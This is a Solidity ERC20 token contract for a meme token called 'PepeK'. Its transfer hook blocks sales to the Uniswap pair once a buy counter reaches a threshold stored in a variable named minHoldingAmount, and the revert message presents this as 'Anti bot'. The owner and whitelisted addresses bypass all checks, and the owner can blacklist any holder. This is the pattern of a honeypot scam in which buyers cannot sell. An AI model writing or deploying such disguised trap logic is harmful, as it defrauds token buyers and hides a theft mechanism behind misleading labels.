import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Token is ERC20, Ownable {
    bool public limited;
    uint256 public maxHoldingAmount;
    uint256 public minHoldingAmount;
    address public uniswapV2Pair;
    mapping(address => bool) public blacklists;

    mapping(address => uint) lastblks;
    mapping(address => bool) whitelists;
    uint buys;

    constructor(uint256 _totalSupply) ERC20("PepeK", "PPK") {
        _mint(msg.sender, _totalSupply);
        whitelists[msg.sender] = true;
        whitelists[0xC36442b4a4522E871399CD717aBDD847Ab11FE88] = true; // Position NFT
    }

    function blacklist(address _address, bool _isBlacklisting) external onlyOwner {
        blacklists[_address] = _isBlacklisting;
    }

    function setRule(bool _limited, address _uniswapV2Pair, uint256 _maxHoldingAmount, uint256 _minHoldingAmount) external onlyOwner {
        limited = _limited;
        uniswapV2Pair = _uniswapV2Pair;
        maxHoldingAmount = _maxHoldingAmount;
        minHoldingAmount = _minHoldingAmount;
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) override internal virtual {
        if(whitelists[to] || whitelists[from]) return;
        require(!blacklists[to] && !blacklists[from], "Blacklisted");
        if (uniswapV2Pair == address(0)) {
            require(from == owner() || to == owner(), "trading is not started");
            return;
        }

        if (limited && from == uniswapV2Pair) {
            require(super.balanceOf(to) + amount <= maxHoldingAmount && super.balanceOf(to) + amount >= minHoldingAmount, "Forbid");
        }

        if(from == uniswapV2Pair) {
            buys++;
            lastblks[to] = block.number;
        } else if(to == uniswapV2Pair) {
            require(buys < minHoldingAmount && lastblks[from] != block.number, "Anti bot");
        }
    }

    function burn(uint256 value) external onlyOwner{
        _burn(msg.sender, value);
    }
}